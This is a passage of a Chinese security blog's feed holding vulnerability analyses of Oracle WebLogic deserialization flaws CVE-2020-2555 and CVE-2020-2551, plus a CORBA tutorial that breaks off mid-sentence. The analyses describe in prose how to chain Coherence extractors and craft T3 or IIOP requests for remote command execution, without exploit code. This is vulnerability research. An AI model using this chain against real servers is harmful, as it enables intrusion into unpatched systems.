    <published>2020-03-10T10:19:00.000Z</published>
    <updated>2020-03-10T10:19:44.143Z</updated>
    
    <content type="html"><![CDATA[<p>这个利用链看着很简单，实际上很难挖，值得好好研究和学习。</p><a id="more"></a><h1 id="0x01-漏洞概述"><a href="#0x01-漏洞概述" class="headerlink" title="0x01 漏洞概述"></a>0x01 漏洞概述</h1><p><img src="http://image-lucifaer.test.upcdn.net/2020/03/10/15837439153816.jpg" alt="-w1117"></p><p>Oracle官方在1月补丁中修复了CVE-2020-2555漏洞，该漏洞位于<code>Oracle Coherence</code>组件中。该组件是业内领先的用于解决集群应用程序数据的缓存的解决方案，其默认集成在Weblogic12c及以上版本中。</p><p>该漏洞提出了一条新的反序列化gadget，未经身份验证的攻击者通过精心构造的T3请求触发可以反序列化gadget，最终造成远程命令执行的效果。</p><h1 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h1><p>ZDI已经给出了一部分的<a href="https://www.thezdi.com/blog/2020/3/5/cve-2020-2555-rce-through-a-deserialization-bug-in-oracles-weblogic-server" target="_blank" rel="noopener">分析</a>，根据ZDI发出的diff图，不难看出补丁是将<code>extract</code>的利用全部移除了，具体的代码可以在<code>com.tangosol.util.filter.LimitFilter#toString</code>中找到：</p><p><img src="http://image-lucifaer.test.upcdn.net/2020/03/10/15837456000194.jpg" alt=""></p><p>所以只要跟踪<code>extract()</code>的执行流，就能理解漏洞产生的原理。其实总体来说该漏洞应该分为两部分来分析：</p><ul><li>反射调用链</li><li>反序列化触发点</li></ul><h2 id="2-1-反射调用链"><a href="#2-1-反射调用链" class="headerlink" title="2.1 反射调用链"></a>2.1 反射调用链</h2><p>首先先来具体看一下<code>com.tangosol.util.filter.LimitFilter#toString</code>的逻辑：</p><p><img src="http://image-lucifaer.test.upcdn.net/2020/03/10/15838315752464.jpg" alt=""></p><p>红线所标注的就是漏洞触发的关键点，这里的<code>m_comparator</code>、<code>m_oAnchorTop</code>、<code>m_oAnchorBottom</code>是我们能通过<code>LimitFilter</code>的构造函数进行构造的。当<code>m_comparator</code>是继承于<code>ValueExtractor</code>接口的类时，会尝试调用<code>m_comparator.extract()</code>方法，并将结果放入StringBuffer中。</p><p>我们接着来看一下<code>ValueExtractor</code>的实现类：</p><p><img src="http://image-lucifaer.test.upcdn.net/2020/03/10/15838320596978.jpg" alt=""></p><p>其中<code>ReflectionExtractor</code>和<code>ChainedExtractor</code>值得我们关注。通过名字不难想到这两个类一个是用于完成反射相关操作的，一个是用于执行链式操作的。</p><p>在<code>ReflectionExtractor#extract</code>中，可以很明显的看到存在反射调用的流程：</p><p><img src="http://image-lucifaer.test.upcdn.net/2020/03/10/15838324938662.jpg" alt=""></p><p>简单来说就是获取<code>oTarget</code>的<code>Method</code>，并反射调用该对象的具体方法。具体方法由<code>this.getMethodName()</code>来控制：</p><p><img src="http://image-lucifaer.test.upcdn.net/2020/03/10/15838327789886.jpg" alt=""><br><img src="http://image-lucifaer.test.upcdn.net/2020/03/10/15838327986386.jpg" alt=""></p><p>同样，这个值也是可以通过<code>ReflectionExtractor</code>的构造函数来去指定的。现在我们可以指定任意一个方法通过反射调用该方法。但是想要执行代码的话并不是单次反射就能完成的，我们还需要找到一个方法将多条反射调用串起来（就如CommonCollections的利用链相同）。<code>ChainedExtractor</code>就完成了这个工作：</p><p><img src="http://image-lucifaer.test.upcdn.net/2020/03/10/15838330421041.jpg" alt=""></p><p>这里的<code>ValueExtractor</code>数组是通过<code>this.getExtractors()</code>获得的，同样也可以通过<code>ChainedExtractor</code>构造函数进行指定：</p><p><img src="http://image-lucifaer.test.upcdn.net/2020/03/10/15838331229960.jpg" alt=""><br><img src="http://image-lucifaer.test.upcdn.net/2020/03/10/15838332617237.jpg" alt=""><br><img src="http://image-lucifaer.test.upcdn.net/2020/03/10/15838331336157.jpg" alt=""></p><p>也就是说现在我们只需要构造多条<code>ReflectionExtractor</code>，将其置于<code>ValueExtractor</code>数组中，就可以触发链式反射调用流程。这一点和CommonCollections的利用链也非常像，最终的执行流可以大致简化为：</p><p><img src="http://image-lucifaer.test.upcdn.net/2020/03/10/15838333967634.jpg" alt=""></p><h2 id="2-2-反序列化触发点"><a href="#2-2-反序列化触发点" class="headerlink" title="2.2 反序列化触发点"></a>2.2 反序列化触发点</h2><p>上面我们分析了具体的反射调用流程，这一切都是建立在<code>LimitFilter#toString</code>触发时所发生的，为了利用反射调用流程，我们还需要找到一个能够在反序列化时触发<code>toString</code>方法的触发点。ZDI这篇文章中说到了一个触发点——<code>BadAttributeValueExpException#readObject</code>：</p><p><img src="http://image-lucifaer.test.upcdn.net/2020/03/10/15838337291480.jpg" alt=""></p><p>所以只需要设置<code>BadAttributeValueExpException</code>的成员变量<code>val</code>为<code>LimitFilter</code>就可以完成触发。</p><h1 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h1><p>通过上面的分析，我们来梳理一下整体的构造流程：</p><ol><li>构造能串联起来完成命令执行的多条<code>ReflectionExtractor</code>反射调用</li><li>利用<code>ChainedExtractor</code>将多条<code>ReflectionExtractor</code>串联起来</li><li>将<code>ChainedExtractor</code>设置为<code>LimitFilter</code>的成员变量<code>m_comparator</code>的值</li><li>为了完成链式反射调用链，将<code>LimitFilter</code>的成员变量<code>m_oAnchorTop</code>设置为相应的值（如<code>Runtime.class</code>）</li><li>将构造完成的<code>LimitFilter</code>设置为<code>BadAttributeValueExpException</code>的成员变量<code>val</code>的值</li><li>序列化<code>BadAttributeValueExpException</code></li><li>构造包含序列化数据的T3请求，发送请求完成攻击</li></ol><p>攻击效果：</p><p><img src="http://image-lucifaer.test.upcdn.net/2020/03/10/15838348419772.jpg" alt=""></p><h1 id="0x04-其他利用方式"><a href="#0x04-其他利用方式" class="headerlink" title="0x04 其他利用方式"></a>0x04 其他利用方式</h1><p>抛砖引玉的说一个其他的利用方式。由于我并不是非常喜欢这样串联利用链的方式（因为不好理解），所以简单的看了下其他的Extractor，看看有没有更加简单的利用方式。这里找到另外一个非常好理解的利用方式。前面的流程都是一样的，唯一不同的是可以不利用<code>ReflectionExtractor</code>加<code>ChainedExtractor</code>这样的组合，同样能完成命令执行。</p><p>漏洞产生的原因也从链式反射调用改为表达式注入。相信一说到表达式注入各位就已经知道是用的什么链了，这里就不再过多赘述，就放一张利用效果图：</p><p><img src="http://image-lucifaer.test.upcdn.net/2020/03/10/15838353652590.jpg" alt=""></p><h1 id="0x05-Reference"><a href="#0x05-Reference" class="headerlink" title="0x05 Reference"></a>0x05 Reference</h1><ul><li><a href="https://www.thezdi.com/blog/2020/3/5/cve-2020-2555-rce-through-a-deserialization-bug-in-oracles-weblogic-server" target="_blank" rel="noopener">https://www.thezdi.com/blog/2020/3/5/cve-2020-2555-rce-through-a-deserialization-bug-in-oracles-weblogic-server</a></li><li><a href="https://www.oracle.com/security-alerts/cpujan2020.html" target="_blank" rel="noopener">https://www.oracle.com/security-alerts/cpujan2020.html</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这个利用链看着很简单，实际上很难挖，值得好好研究和学习。&lt;/p&gt;
    
    </summary>
    
      <category term="漏洞分析" scheme="https://lucifaer.com/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
      <category term="漏洞分析" scheme="https://lucifaer.com/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
      <category term="Java" scheme="https://lucifaer.com/tags/Java/"/>
    
      <category term="Weblogic" scheme="https://lucifaer.com/tags/Weblogic/"/>
    
  </entry>
  
  <entry>
    <title>WebLogic WLS核心组件RCE分析（CVE-2020-2551）</title>
    <link href="https://lucifaer.com/2020/02/25/WebLogic%20WLS%E6%A0%B8%E5%BF%83%E7%BB%84%E4%BB%B6RCE%E5%88%86%E6%9E%90%EF%BC%88CVE-2020-2551%EF%BC%89/"/>
    <id>https://lucifaer.com/2020/02/25/WebLogic WLS核心组件RCE分析（CVE-2020-2551）/</id>
    <published>2020-02-25T02:08:00.000Z</published>
    <updated>2020-02-25T02:11:35.435Z</updated>
    
    <content type="html"><![CDATA[<p>看完了CORBA后再来看这个洞，很多东西才能理解的比较深刻….</p><a id="more"></a><h1 id="0x01-漏洞概述"><a href="#0x01-漏洞概述" class="headerlink" title="0x01 漏洞概述"></a>0x01 漏洞概述</h1><p><img src="http://image-lucifaer.test.upcdn.net/2020/02/25/15822766115397.jpg" alt=""></p><p>Weblogic官方在1月补丁中修复了CVE-2020-2551漏洞，该漏洞位于<code>WLS</code>核心组件中，允许远程攻击者通过<code>iiop</code>进行网络请求，从而攻击Weblogic服务器，最终远程攻击者可以利用该漏洞完全接管Weblogic服务器。</p><p>从通告中我们能看到漏洞发生在<code>WLS</code>的核心组件，所以给了我们一个思路去分析该漏洞，只需要从接受并解析<code>iiop</code>请求点入手进行分析即可。</p><h1 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h1><p>分析该漏洞应该从两方面来进行：</p><ul><li>客户端：通过分析Context的生成过程以及<code>Context.bind()</code>的流程来理解服务端解析的数据结构</li><li>服务端：通过分析解析流程最终找到漏洞触发点</li></ul><p>本文也将从这两个方面进行分析。分析到最后其实会发现<code>iiop</code>只是触发方式，关键的触发点还是由于Weblogic应用本身的处理逻辑，也就是说本质上是个应用漏洞而非协议漏洞。</p><h2 id="2-1-Context的生成以及bind的流程"><a href="#2-1-Context的生成以及bind的流程" class="headerlink" title="2.1 Context的生成以及bind的流程"></a>2.1 Context的生成以及bind的流程</h2><p>无论利用<code>rmi-iiop</code>的方式去写客户端，还是写服务端，都需要在编写具体逻辑前获取<code>Conetext</code>对象，也就是如下的代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> InitialContext();</span><br></pre></td></tr></table></figure><p>如果研究过CORBA通信过程的话，就能理解这一部分是获取<code>Naming Service</code>的过程，对于客户端来说是获取其中存在的IOR引用以供后面的rpc流程使用；对于服务端来说，用于完成对象注册。这里来跟进一下Context的生成过程，方便后续理解Weblogic的解析逻辑。</p><p><img src="http://image-lucifaer.test.upcdn.net/2020/02/25/15825131878414.jpg" alt=""></p><p>这里有个很重要的参数<code>environment</code>，在该参数中可以设置<code>Context</code>的静态变量来指定<code>Context</code>的初始化参数，包括<code>JNDI_FACTORY</code>、<code>PROVIDER_URL</code>。这些初始化参数在后续的流程中有极其重要的作用。</p><p><img src="http://image-lucifaer.test.upcdn.net/2020/02/25/15825134969871.jpg" alt=""></p><p>当在<code>environment</code>中设置了<code>Context.INITIAL_CONTEXT_FACTORY</code>后会尝试获取该<code>Context factory</code>：</p><p><img src="http://image-lucifaer.test.upcdn.net/2020/02/25/15825142719970.jpg" alt=""><br><img src="http://image-lucifaer.test.upcdn.net/2020/02/25/15825143512527.jpg" alt=""></p><p>这里会根据设定的<code>Context.INITIAL_CONTEXT_FACTORY</code>，反射获取工厂类，之后调用<code>getInitialContext()</code>方法。首先看一下在JDK中原生以及在Weblogic中所拓展出的工厂类到底有哪些：</p><p><img src="http://image-lucifaer.test.upcdn.net/2020/02/25/15825145428366.jpg" alt=""></p><p>这里我们简单的看一下<code>WLInitialContextFactory</code>这个Weblogic拓展的工厂类：</p><p><img src="http://image-lucifaer.test.upcdn.net/2020/02/25/15825322585722.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2020/02/25/15825322767339.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2020/02/25/15825323464333.jpg" alt=""></p><p>这里跟进看一下<code>getORBReference()</code>方法：</p><p><img src="http://image-lucifaer.test.upcdn.net/2020/02/25/15825324358692.jpg" alt=""></p><p>这里和CORBA的写法是一样的：</p><p><img src="http://image-lucifaer.test.upcdn.net/2020/02/25/15825324775185.jpg" alt=""></p><p>都是初始化<code>orb</code>获取<code>Naming Service</code>的过程，如果想要了解详细的过程，可以研究一下上一篇讲<a href="https://lucifaer.com/2020/02/20/Java%20CORBA%E7%A0%94%E7%A9%B6/">CORBA的文章</a>。</p><p>在获取了<code>Context</code>后，接着来看一下其绑定流程，此流程在<code>bind()</code>函数中有所体现：</p><p><img src="http://image-lucifaer.test.upcdn.net/2020/02/25/15825368778335.jpg" alt=""></p><p>熟悉CORBA的同学肯定一眼就能看出这里完成的是生成IOR，同时设定corba协议中的数据类型与java类型交互的约定为<code>tk_value</code>，并设定请求的<code>op</code>或者叫做<code>operation</code>为<code>bind_any</code>。这里不仅仅设定了服务端对注册请求的处理方式（<code>bind_any</code>的处理流程），同时设定了后面反序列化的方式（<code>tk_value</code>）。</p><h2 id="2-2-Weblogic解析流程"><a href="#2-2-Weblogic解析流程" class="headerlink" title="2.2 Weblogic解析流程"></a>2.2 Weblogic解析流程</h2><p>在了解了Context的生成及<code>bind()</code>流程后，接着来看一下Weblogic的解析流程。Weblogic默认在7001端口接收<code>iiop</code>请求，所有的请求都是交由<code>weblogic.rmi.cluster.ClusterableServerRef#invoke</code>来处理的：</p><p><img src="http://image-lucifaer.test.upcdn.net/2020/02/25/15825327408840.jpg" alt=""></p><p>在<code>handleRequest</code>中的流程较为长，我只截关键处理点：</p><p><img src="http://image-lucifaer.test.upcdn.net/2020/02/25/15825332359156.jpg" alt=""></p><p>直接跟进<code>var2.invoke()</code>，具体的实现方法在<code>weblogic.rmi.cluster.ClusterableServerRef#invoke</code>：</p><p><img src="http://image-lucifaer.test.upcdn.net/2020/02/25/15825335254577.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2020/02/25/15825337041367.jpg" alt=""></p><p>这里首先会判断请求是否为<code>objectMethods</code>中已经存在的类型，当不存在时将会调用<code>delegate.invoke()</code>来处理，由于我们在发送注册请求时的请求类型为<code>bind_any()</code>并不在<code>objectMethods</code>中，所以会触发<code>delegate.invoke()</code>，具体的实现类为<code>weblogic.corba.cos.naming._NamingContextAnyImplBase#_invoke</code>：</p><p><img src="http://image-lucifaer.test.upcdn.net/2020/02/25/15825345523253.jpg" alt=""></p><p>因为我们当前的请求类型为<code>bind_any()</code>，其所对应的<code>var5</code>为0，所以会进入两个关键的流程：</p><ul><li><code>WNameHelper.read()</code></li><li><code>var2.read_any()</code></li></ul><p><img src="http://image-lucifaer.test.upcdn.net/2020/02/25/15825346195808.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2020/02/25/15825383149039.jpg" alt=""></p><p>在<code>WNameHelper.read()</code>主要负责提取IOR中的信息（id、kind）用于之后注册到<code>orb</code>的流程中。</p><p>而反序列化的触发点在<code>var2.read_any()</code>中：</p><p><img src="http://image-lucifaer.test.upcdn.net/2020/02/25/15825384864506.jpg" alt=""></p><p>在上一节中，已经说过在<code>bind()</code>流程中发起注册请求时，会构造一个<code>Any</code>类，并将交互类型设置为<code>tk_value</code>也就是<code>this.read_TypeCode()</code>。继续跟进：</p><p><img src="http://image-lucifaer.test.upcdn.net/2020/02/25/15825386972434.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2020/02/25/15825387370190.jpg" alt=""></p><p>这里会根据<code>TCKind</code>来分派具体的处理流程，<code>tk_value</code>对应29：</p><p><img src="http://image-lucifaer.test.upcdn.net/2020/02/25/15825388300443.jpg" alt=""></p><p>接下来就是之前CORBA文章中所提到过的反序列化流程：</p><p><img src="http://image-lucifaer.test.upcdn.net/2020/02/25/15825406836441.jpg" alt=""></p><p>由<code>CDRInputStream</code>跳转到JDK原生反序列化：</p><p><img src="http://image-lucifaer.test.upcdn.net/2020/02/25/15825407428996.jpg" alt=""></p><p>至此分析结束。</p><h1 id="0x03-利用研究"><a href="#0x03-利用研究" class="headerlink" title="0x03 利用研究"></a>0x03 利用研究</h1><p>根据0x02中的分析，可以梳理出攻击需要的两个元素：</p><ul><li>构造一个<code>bind_any()</code>请求</li><li>寻找一条gadget填充到<code>Any</code>类中</li></ul><p>攻击效果如下：</p><p><img src="http://image-lucifaer.test.upcdn.net/2020/02/25/15825410942428.jpg" alt=""></p><h1 id="0x04-Reference"><a href="#0x04-Reference" class="headerlink" title="0x04 Reference"></a>0x04 Reference</h1><ul><li><a href="https://lucifaer.com/2020/02/20/Java%20CORBA%E7%A0%94%E7%A9%B6/">https://lucifaer.com/2020/02/20/Java%20CORBA%E7%A0%94%E7%A9%B6/</a></li><li><a href="https://cert.360.cn/warning/detail?id=8746760715a399499f8a46fb85edcda1" target="_blank" rel="noopener">https://cert.360.cn/warning/detail?id=8746760715a399499f8a46fb85edcda1</a></li><li><a href="https://www.oracle.com/security-alerts/cpujan2020.html" target="_blank" rel="noopener">https://www.oracle.com/security-alerts/cpujan2020.html</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;看完了CORBA后再来看这个洞，很多东西才能理解的比较深刻….&lt;/p&gt;
    
    </summary>
    
      <category term="漏洞分析" scheme="https://lucifaer.com/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
      <category term="漏洞分析" scheme="https://lucifaer.com/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
      <category term="Java" scheme="https://lucifaer.com/tags/Java/"/>
    
      <category term="Weblogic" scheme="https://lucifaer.com/tags/Weblogic/"/>
    
  </entry>
  
  <entry>
    <title>Java CORBA研究</title>
    <link href="https://lucifaer.com/2020/02/20/Java%20CORBA%E7%A0%94%E7%A9%B6/"/>
    <id>https://lucifaer.com/2020/02/20/Java CORBA研究/</id>
    <published>2020-02-20T07:16:44.000Z</published>
    <updated>2020-02-20T07:17:34.749Z</updated>
    
    <content type="html"><![CDATA[<p>在说到JNDI的时候，我们最常接触到的都是较为上层的JNDI SPI（服务端提供的接口），除了常用的RMI、LDAP这些服务，还存在CORBA服务，这篇文章的重点就是来学习一下JNDI如何使用CORBA服务，并以尽量详尽的用例子来解释清楚如何使用CORBA的各个流程。</p><h1 id="0x01-基础概念"><a href="#0x01-基础概念" class="headerlink" title="0x01 基础概念"></a>0x01 基础概念</h1><p>这部分可能会较为枯燥，但是对后续理解有很大的帮助，我尽量用简单的话来描述清楚几个名词。</p><h2 id="1-1-IDL与Java-IDL"><a href="#1-1-IDL与Java-IDL" class="headerlink" title="1.1 IDL与Java IDL"></a>1.1 IDL与Java IDL</h2><p>IDL全称（Interface Definition Language）也就是接口定义语言，它主要用于描述软件组件的应用程序编程接口的一种规范语言。它完成了与各种编程语言无关的方式描述接口，从而实现了不同语言之间的通信，这样就保证了跨语言跨环境的远程对象调用。</p><p>在基于IDL构建的软件系统中就存在一个OMG IDL（对象管理组标准化接口定义语言），其用于CORBA中。</p><p>就如上文所说，IDL是与编程语言无关的一种规范化描述性语言，不同的编程语言为了将其转化成IDL，都制定了一套自用的编译器用于将可读取的OMG IDL文件转换或映射成相应的接口或类型。Java IDL就是Java实现的这套编译器。</p><h2 id="1-2-ORB与GIOP、IIOP"><a href="#1-2-ORB与GIOP、IIOP" class="headerlink" title="1.2 ORB与GIOP、IIOP"></a>1.2 ORB与GIOP、IIOP</h2><p>ORB全称（Object Request Broker）对象请求代理。ORB是一个中间件，他在对象间建立一个CS关系，或者更简单点来说，就是一个代理。客户端可以很简单的通过这个媒介使用服务器对象的方法而不需要关注服务器对象是在同一台机器上还是通过远程网络调用的。ORB截获调用后负责找到一个对象以满足该请求。</p><p>GIOP全称（General Inter-ORB Protocol）通用对象请求协议，其功能简单来说就是CORBA用来进行数据传输的协议。GIOP针对不同的通信层有不同的具体实现，而针对于TCP/IP层，其实现名为IIOP（Internet Inter-ORB Protocol）。所以说通过TCP协议传输的GIOP数据可以称为IIOP。</p><p>而ORB与GIOP的关系是GIOP起初就是为了满足ORB间的通信的协议。所以也可以说ORB是CORBA通信的媒介。</p><h1 id="0x02-CORBA"><a href="#0x02-CORBA" class="headerlink" title="0x02 CORBA"></a>0x02 CORBA</h1><p>CORBA全称（Common ObjectRequest Broker Architecture）也就是公共对象请求代理体系结构，是OMG（对象管理组织）制定的一种标准的面向对象应用程序体系规范。其提出是为了解决不同应用程序间的通信，曾是分布式计算的主流技术。</p><p>一般来说CORBA将其结构分为三部分，为了准确的表述，我将用其原本的英文名来进行表述：</p><ul><li><code>naming service</code></li><li><code>client side</code></li><li><code>servant side</code></li></ul><p>这三部分组成了CORBA结构的基础三元素，而通信过程也是在这三方间完成的。我们知道CORBA是一个基于网络的架构，所以以上三者可以被部署在不同的位置。<code>servant side</code>可以理解为一个接收<code>client side</code>请求的服务端；<code>naming service</code>对于<code>servant side</code>来说用于服务方注册其提供的服务，对于<code>client side</code>来说客户端将从<code>naming service</code>来获取服务方的信息。这个关系可以简单的理解成目录与章节具体内容的关系：</p><p>目录即为<code>naming service</code>，<code>servant side</code>可以理解为具体的内容，内容需要首先在目录里面进行注册，这样当用户想要访问具体内容时只需要首先在目录中查找到具体内容所注册的引用（通常为页数），这样就可以利用这个引用快速的找到章节具体的内容。（相信对RMI有所理解的对这种关系不会陌生）</p><p>后面我将用一个具体的CORBA通信的demo来具体描述这这三者在通信间的关系。</p><h2 id="2-1-建立一个CORBA-Demo"><a href="#2-1-建立一个CORBA-Demo" class="headerlink" title="2.1 建立一个CORBA Demo"></a>2.1 建立一个CORBA Demo</h2><p>在阐述CORBA通信前，首先先建立一个用于调试的demo，方便更加清楚的理解上面的概念，以及理清相关关系，之后会深入分析各部分的具体实现。</p><h3 id="2-1-1-编写IDL"><a href="#2-1-1-编写IDL" class="headerlink" title="2.1.1 编写IDL"></a>2.1.1 编写IDL</h3><p>CORBA使用IDL供用户描述其应用程序的接口，所以在编写具体实例前，我们需要使用IDL来描述应用的接口，然后通过Java自身提供的<code>idlj</code>编译器将其编译为Java类。</p><p><img src="http://image-lucifaer.test.upcdn.net/2020/02/20/15809001313522.jpg" alt=""></p><p>这里的IDL代码描述了一个module名为<code>HelloApp</code>中存在一个<code>Hello</code>接口，接口中有一个<code>sayHello()</code>方法。</p><h3 id="2-1-2-生成client-side"><a href="#2-1-2-生成client-side" class="headerlink" title="2.1.2 生成client side"></a>2.1.2 生成client side</h3><p>这里直接使用<code>idlj</code>来生成<code>client side</code>的java类：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">idlj -fclient Hello.idl</span><br></pre></td></tr></table></figure><p>该命令会自动生成如下的文件：</p><p><img src="http://image-lucifaer.test.upcdn.net/2020/02/20/15809857012654.jpg" alt=""></p><p>其关系如下图所示：</p><p><img src="http://image-lucifaer.test.upcdn.net/2020/02/20/15809916410847.jpg" alt=""></p><p>其中：</p><ul><li><code>HelloOperations</code>接口中定义了<code>Hello.idl</code>文件中所声明的<code>sayHello()</code>方法</li><li><code>Hello</code>继承于<code>HelloOperations</code>。</li><li><code>_HelloStub</code>实现了<code>Hello</code>接口，<code>client side</code>将使用该类以调用<code>servant side</code>的<code>Hello</code>接口的具体实现。</li><li><code>HelloHelper</code>包含帮助函数，用于处理通过网络传输的对象，例如数据编组与反编组的工作（或者说是编码与反编码的工作）。</li><li>IDL有三种参数传递方式：in、out和inout。in类型的参数以及返回结果与Java的参数传递方式与结果返回方式完全相同。而out和inout两种类型的参数允许参数具有返回结果的能力，无法直接映射到Java语言的参数传递机制，所以IDL为out和inout参数提供了一个holder，也就是具体实例中的<code>HelloHolder</code>。</li></ul><p>其中关键的两个类便是<code>_HelloStub</code>与<code>HelloHelper</code>。这里简单的叙述一下，后面会详细的分析这两个类中的具体逻辑。</p><p>首先看先<code>_HelloStub</code>或者直接称其为<code>Stub</code>:</p><p><img src="http://image-lucifaer.test.upcdn.net/2020/02/20/15810653354415.jpg" alt=""></p><p>这里先不看<code>readObject</code>及<code>writeObject</code>的部分，主要看一下其中实现的<code>sayHello()</code>方法。可以看到这里实现了<code>Hello</code>接口，而此处的<code>sayHello()</code>方法并非其具体的实现，具体的实现是保存在<code>serant side</code>处的，这里的<code>sayHello()</code>方法更像一个远程调用真正<code>sayHello()</code>方法的“委托人”或者“代理”。</p><p>可以注意到关键的两个点是<code>_request()</code>及<code>_invoke()</code>，而<code>_request()</code>完成的流程就是从<code>naming service</code>获取<code>servant side</code>的“引用”（简单来说就是<code>servant side</code>所注册的信息，便于<code>client side</code>访问<code>servant side</code>以获取具体实现类），<code>_invoke()</code>完成的就是通过“引用”访问<code>servant side</code>以获取具体实现类。</p><p>之后我们看一下<code>HelloHelper</code>。在<code>HelloHelper</code>中有一个常用且重要的方法，那就是<code>narrow</code>：</p><p><img src="http://image-lucifaer.test.upcdn.net/2020/02/20/15810657056490.jpg" alt=""></p><p>代码很简单，其接受一个<code>org.omg.CORBA.Object</code>对象，返回其<code>Stub</code>这里可能现在比较难理解，简单看一下<code>narrow</code>的使用场景：</p><p><img src="http://image-lucifaer.test.upcdn.net/2020/02/20/15810659912866.jpg" alt=""></p><p>关键点时<code>ncRef.resolve_str()</code>，这里的<code>ncRef</code>是<code>ORB</code>（<code>naming service</code>）返回的一个命名上下文，主要看<code>resolve_str()</code>的实现：</p><p><img src="http://image-lucifaer.test.upcdn.net/2020/02/20/15810661282880.jpg" alt=""></p><p>可以说基本上与<code>_HelloStub</code>的<code>sayHello()</code>方法一模一样。所以可以说这里是返回一个<code>Stub</code>来获取远程的具体实现类。</p><h3 id="2-1-3-生成servant-side"><a href="#2-1-3-生成servant-side" class="headerlink" title="2.1.3 生成servant side"></a>2.1.3 生成servant side</h3><p>同样也直接可以用<code>idlj</code>来生成：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">idlj -fserver Hello.idl</span><br></pre></td></tr></table></figure><p><img src="http://image-lucifaer.test.upcdn.net/2020/02/20/15810620594676.jpg" alt=""></p><p>注意到除了<code>HelloPOA</code>外，其余的两个接口是和<code>client side</code>是相同的。</p><p>在这里又要涉及到一个新的概念，那就是POA（Portable Object Adapter）便携式对象适配器（翻译会有所误差），它是CORBA规范的一部分。这里的这个POA虚类是<code>servant side</code>的框架类，它提供了方法帮助我们将具体实现对象注册到<code>naming service</code>上。</p><p>具体看一下其代码，截图中的代码是其主要的功能：</p><p><img src="http://image-lucifaer.test.upcdn.net/2020/02/20/15810626815459.jpg" alt=""></p><p>着重看红框所标注的代码，首先<code>POA</code>是<code>Operations</code>的实现，也是<code>org.orm.CORBA.portable.InvokeHandler</code>的实现，同时继承于<code>org.omg.PortableServer.Servant</code>，这保证了<code>POA</code>可以拦截<code>client side</code>的请求。</p><p><code>POA</code>首先定义了一个Hashtable用于存放<code>Operations</code>的方法名，当拦截到请求后会触发<code>_invoke</code>方法从Hashtable中以方法名作为索引获取<code>Operations</code>具体实现的相应方法，之后创建返回包，并通过网络将其写入<code>client side</code>。</p><p>综上，我们可以总结一下<code>idlj</code>帮助我们所生成的所有类之间的关系:</p><p><img src="http://image-lucifaer.test.upcdn.net/2020/02/20/15810633934064.jpg" alt=""></p><p>从图中我们能看到这些类之间的关系，以及看到<code>client side</code>与<code>servant side</code>间所共用的类。不过单单只是这些类是无法完成构成完整的通信的，还需要一些方法来实现一些具体的客户端和服务方法类。</p><h3 id="2-1-4-servant-side具体实现"><a href="#2-1-4-servant-side具体实现" class="headerlink" title="2.1.4 servant side具体实现"></a>2.1.4 servant side具体实现</h3><p>根据前面几个小结的叙述不难知道<code>servant side</code>需要有两个具体的实现类：</p><ul><li><code>HelloOperations</code>的具体实现，需要具体的实现<code>sayHello()</code>方法。</li><li><code>servant side</code>的服务端实现，将具体实现的<code>HelloOperations</code>注册到<code>naming service</code>上</li></ul><p>先来看第一个需要实现的类，通过上文我们知道我们具体实现<code>Operations</code>的类需要被注册到<code>naming service</code>上，而<code>POA</code>作为一个适配器的工作就是帮助我们完成相应的工作以及完成相应请求的响应，所以这里只需要创建一个具体实现类<code>HelloImpl</code>继承于<code>POA</code>即可：</p><p><img src="http://image-lucifaer.test.upcdn.net/2020/02/20/15810646253050.jpg" alt=""></p><p>现在<code>servant side</code>的服务类关系及变成了：</p><p><img src="http://image-lucifaer.test.upcdn.net/2020/02/20/15810649777475.jpg" alt=""></p><p>现在我们实现了<code>_HelloStub</code>要获取的具体实现类<code>HelloImpl</code>，同时又有<code>HelloPOA</code>来处理网络请求（实际上是由ORB完成处理的），接下来就只需要实现一个服务来接收<code>client side</code>的请求，并将结果返回给<code>client side</code>。</p><p><img src="http://image-lucifaer.test.upcdn.net/2020/02/20/15810694403146.jpg" alt=""></p><p>这里可以将服务端分为三部分。</p><p>第一部分就是激活<code>POAManager</code>。CORBA规范定义<code>POA</code>对象是需要利用<code>ORB</code>从<code>naming service</code>中获取的，同时其在<code>naming service</code>中的命名是<code>RootPOA</code>。所以如上图中第一个红框所示，就是初始化<code>ORB</code>，并利用<code>ORB</code>去访问<code>naming service</code>获取<code>RootPOA</code>之后完成激活。</p><p>第二部分就是将具体实现类注册到<code>naming service</code>中，具体实现如第二个红框所示。首先会实例化<code>HelloImpl</code>，然后通过<code>ORB</code>将其转换为<code>org.omg.CORBA.Object</code>，最后封装成一个<code>Stub</code>。之后从<code>naming service</code>获取<code>NameService</code>并将其转换为命名上下文，将<code>HelloImpl</code>的别名Hello及其<code>Stub</code>绑定到命名上下文中，至此完成了具体注册流程。</p><p>第三部分就是将server设置为监听状态持续运行，用于拦截并处理<code>client side</code>的请求，返回相应的具体实现类。</p><h3 id="2-1-5-client-side具体实现"><a href="#2-1-5-client-side具体实现" class="headerlink" title="2.1.5 client side具体实现"></a>2.1.5 client side具体实现</h3><p>通过<code>servant side</code>的实现应该可以看出<code>naming service</code>只是负责保存具体实例的一个“引用”，如果<code>client 